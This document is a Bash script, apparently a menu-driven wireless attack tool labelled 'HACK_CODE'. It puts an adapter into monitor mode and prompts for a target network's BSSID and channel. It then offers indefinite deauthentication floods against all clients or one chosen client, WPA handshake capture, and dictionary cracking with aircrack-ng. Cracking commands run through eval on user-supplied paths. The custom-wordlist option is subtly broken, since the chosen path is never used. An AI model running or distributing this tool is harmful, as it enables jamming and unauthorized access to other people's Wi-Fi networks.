#!/bin/bash

# Convert the script to Unix format (if needed)
dos2unix "$0"

# Make the script executable
chmod +x "$0"

# Function to start the script over
restart_script() {
    exec "$0" "$@"
}

# Function to capture and save the .cap file
capture_and_save() {
    read -p "Enter the folder name for capture files: " folder_name
    read -p "Enter the name for capture files (without extension): " file_name
    mkdir -p "$folder_name"
    capture_file="$folder_name/$file_name"

    # Launch the scanning process in a new terminal tab
    xterm -e "sudo airodump-ng -c $target_channel --bssid $target_bssid -w $capture_file wlan0" &
    sleep 2

    # Deauthenticate clients
    sudo aireplay-ng --deauth 0 -a $target_bssid wlan0

    # Wait for the capture process to complete
    sleep 2

    # Check if wlan0 is on the correct channel
    current_channel=$(iwlist wlan0 channel | grep "Current Frequency" | awk '{print $5}')
    if [[ "$current_channel" != "$target_channel" ]]; then
        echo -e "\e[91m ██  ██  ██████   █████  ██████  ██   ██          ██████  ██████  ██████  ███████ 
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ██  ████ ██   ██ ██      
 ██  ██  ██   ██ ███████ ██████  █████           ██      ██ ██ ██ ██   ██ █████   
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ████  ██ ██   ██ ██      
 ██  ██  ██████  ██   ██ ██   ██ ██   ██ ███████  ██████  ██████  ██████  ███████ 
                                                                                  
                                                                                  
"
        echo "wlan0 is on channel $current_channel, but the AP uses channel $target_channel."
        return
    fi

    # Prompt user for wordlist choice
    wordlist_choice=$(zenity --list --title="Select Wordlist Source" --column="Option" "Use all wordlists from /usr/share/wordlists/" "Specify your own wordlist path")

    if [[ "$wordlist_choice" == "Use all wordlists from /usr/share/wordlists/" ]]; then
        # List available wordlists in /usr/share/wordlists/
        wordlists_dir="/usr/share/wordlists"
        wordlists=($(ls "$wordlists_dir"))

        # Prompt user to choose a wordlist using a popup tab
        selected_wordlist=$(zenity --list --title="Select Wordlist" --column="Wordlist" "${wordlists[@]}")

        if [[ -n "$selected_wordlist" ]]; then
            echo "Using wordlist: $selected_wordlist"
            wordlist="$wordlists_dir/$selected_wordlist"
        else
            echo "Invalid wordlist selection."
            return
        fi
    elif [[ "$wordlist_choice" == "Specify your own wordlist path" ]]; then
        # Prompt user for custom wordlist path using a popup tab
        custom_wordlist=$(zenity --file-selection --title="Select Custom Wordlist" --file-filter="Wordlist files ( *.txt *.lst ) | *.txt *.lst")

        if [[ -f "$custom_wordlist" ]]; then
            echo "Using custom wordlist: $custom_wordlist"
        else
            echo "Custom wordlist not found."
            return
        fi
    else
        echo "Invalid wordlist choice."
        return
    fi

    # Run Aircrack-ng
    last_command="aircrack-ng -w \"$wordlist\" \"$capture_file-01.cap\""
    eval "$last_command"

    # After Aircrack-ng, ask if the user wants to restart the script
    read -p "Do you want to run the script again? (y/n): " restart_choice
    if [[ "$restart_choice" == "y" ]]; then
        restart_script
    else
        echo "Exiting..."
        exit 0
    fi
}

# Function to perform Aircrack
aircrack() {
    aircrack_choice=$(zenity --list --title="Aircrack Options" --column="Option" "Use all wordlists from /usr/share/wordlists/" "Specify your own wordlist path")

    if [[ "$aircrack_choice" == "Use all wordlists from /usr/share/wordlists/" ]]; then
        # List available wordlists in /usr/share/wordlists/
        wordlists_dir="/usr/share/wordlists"
        wordlists=($(ls "$wordlists_dir"))

        # Prompt user to choose a wordlist using a popup tab
        selected_wordlist=$(zenity --list --title="Select Wordlist" --column="Wordlist" "${wordlists[@]}")

        if [[ -n "$selected_wordlist" ]]; then
            echo "Using wordlist: $selected_wordlist"
            wordlist="$wordlists_dir/$selected_wordlist"
        else
            echo "Invalid wordlist selection."
            return
        fi
    elif [[ "$aircrack_choice" == "Specify your own wordlist path" ]]; then
        # Prompt user for custom wordlist path using a popup tab
        custom_wordlist=$(zenity --file-selection --title="Select Custom Wordlist" --file-filter="Wordlist files ( *.txt *.lst ) | *.txt *.lst")

        if [[ -f "$custom_wordlist" ]]; then
            echo "Using custom wordlist: $custom_wordlist"
        else
            echo "Custom wordlist not found."
            return
        fi
    else
        echo "Invalid choice."
        return
    fi

    # Prompt user for the path to the .cap file using a popup tab
    cap_file_path=$(zenity --file-selection --title="Select .cap File" --file-filter="Capture files ( *.cap ) | *.cap")

    # Check if the .cap file exists
    if [[ -f "$cap_file_path" ]]; then
        # Run Aircrack-ng
        aircrack_command="aircrack-ng -w \"$wordlist\" \"$cap_file_path\""
        echo "Running Aircrack-ng..."
        eval "$aircrack_command"
    else
        echo "The specified .cap file does not exist."
    fi
}

# Function to run tcpdump to capture packets
run_tcpdump() {
    read -p "Enter the filename to save the capture (e.g., capture.pcap): " pcap_file
    sudo tcpdump -i wlan0 -w "$pcap_file"
}

# Display the red logo
echo -e "\e[91m ██  ██  ██████   █████  ██████  ██   ██          ██████  ██████  ██████  ███████ 
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ██  ████ ██   ██ ██      
 ██  ██  ██   ██ ███████ ██████  █████           ██      ██ ██ ██ ██   ██ █████   
████████ ██   ██ ██   ██ ██   ██ ██  ██          ██      ████  ██ ██   ██ ██      
 ██  ██  ██████  ██   ██ ██   ██ ██   ██ ███████  ██████  ██████  ██████  ███████ 
                                                                                  
                                                                                  
"

# Start monitor mode on wlan0
sudo airmon-ng start wlan0

# Kill interfering processes
sudo airmon-ng check kill

# Start airodump-ng to list available networks
sudo airodump-ng wlan0

# Prompt user for target network BSSID and channel
read -p "Enter the BSSID of the target network: " target_bssid
read -p "Enter the channel of the target network: " target_channel

command_history=()

while true; do
    # Display menu with network information (bold)
    echo -e "\e[1mSame Network - BSSID: $target_bssid, Channel: $target_channel\e[0m:"
    echo "1. Deauthenticate all clients"
    echo "2. Deauthenticate one specific client"
    echo "3. Scan the target network"
    echo "4. Deauthenticate clients and save capture file with custom folder and file names"
    echo "5. Restart"
    echo "6. Change Channel (sudo iwconfig wlan0 channel)"
    echo "7. Aircrack - WiFi WPA/WPA2-PSK Cracker"
    echo "8. PUTTY"
    echo "9. Run tcpdump to capture packets"
    echo "10. Launch Wireshark"
    echo "11. Launch Tshark for packet analysis"
    echo "12. Exit"

    # Prompt user for choice
    read -p "Enter your choice: " choice

    case $choice in
        1)
            # Deauthenticate all clients
            sudo aireplay-ng --deauth 0 -a $target_bssid wlan0
            ;;
        2)
            # Deauthenticate a specific client
            read -p "Enter the MAC address of the client to deauthenticate: " client_mac
            sudo aireplay-ng --deauth 0 -a $target_bssid -c $client_mac wlan0
            ;;
        3)
            # Scan the target network
            sudo airodump-ng -c $target_channel --bssid $target_bssid wlan0
            ;;
        4)
            # Deauthenticate clients and save capture file with custom folder and file names
            capture_and_save
            ;;
        5)
            # Restart the script
            restart_script
            ;;
        6)
            # Change Channel using sudo iwconfig wlan0 (channel)
            read -p "Enter the channel you want to set: " channel_to_set
            sudo iwconfig wlan0 channel $channel_to_set
            ;;
        7)
            # Aircrack choice
            aircrack
            ;;
        8)
            # Launch PuTTY if available
            if command -v putty > /dev/null; then
                echo "Launching PuTTY..."
                putty
            else
                echo "PuTTY is not installed. Do you want to install it? (y/n)"
                read install_putty_choice
                if [[ "$install_putty_choice" == "y" ]]; then
                    sudo apt-get update
                    sudo apt-get install putty
                fi
            fi
            ;;
        9)
            # Run tcpdump to capture packets
            run_tcpdump
            ;;
        10)
            # Launch Wireshark
            wireshark
            ;;
        11)
            # Launch Tshark for packet analysis
            read -p "Enter the path to the pcap file for analysis: " pcap_file_path
            tshark -r "$pcap_file_path"
            ;;
        12)
            # Exit
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid choice. Please select a valid option."
            ;;
    esac
done
